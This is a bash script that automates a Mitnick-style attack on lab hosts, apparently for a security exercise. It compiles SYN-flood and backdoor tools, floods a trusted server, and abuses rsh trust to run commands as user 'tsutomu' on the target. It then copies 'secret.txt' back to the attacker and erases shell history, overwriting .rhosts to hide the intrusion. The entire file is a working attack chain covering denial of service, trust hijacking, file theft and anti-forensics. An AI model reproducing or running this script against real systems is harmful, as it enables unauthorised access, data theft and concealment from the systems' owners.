#!/bin/bash

attacker_ip="172.16.14.2"
server_ip="172.16.14.3"
xterminal_ip="172.16.14.4"
username="tsutomu"
port="513"

function compile() {
	gcc synflood.c -lnet -o synflood &> /dev/null
	gcc backdoor.c -lnet -lpcap -o backdoor &> /dev/null
}

function flood() {
	sudo ./synflood "disable" "$server_ip" "$port"
}

function backdoor() {
	sudo ./backdoor "$xterminal_ip" "$port" "$attacker_ip" "$server_ip"
}

function exec() {
#	printf "DEBUG: rsh -l \"$username\" \"$xterminal_ip\" \"$1\"\n"	
	rsh -l "$username" "$xterminal_ip" "$1"
}

function rlogin() {
#	printf "DEBUG: rlogin -l \"$username\" \"$xterminal_ip\"\n"
	bash -c "rlogin -l \"$username\" \"$xterminal_ip\""
}

function cleanup() {
	exec "sleep 5 && echo > .bash_history &"
	exec "printf \"server tsutomu\\\n\" > .rhosts"
	sudo ./synflood enable "$server_ip" "$port"
	echo > ~/.bash_history
}

printf "[*] Compiling...\n"
compile

printf "[*] Flooding...\n"
flood

printf "[*] Creating backdoor...\n"
backdoor $xterminal_ip $port $attacker_ip $server_ip

sleep 5

printf "[*] Saving secret.txt...\n"
#while !(secret=$(exec "cat secret.txt")); do
#	flood
#	backdoor $xterminal_ip $port $attacker_ip $server_ip
#	sleep 20
#done
secret=$(exec "cat secret.txt")
echo "$secret" > secret.txt

printf "[*] Cleaning up...\n"
cleanup

printf "[*] Done\n"

printf "\n\nsecret: $secret\n"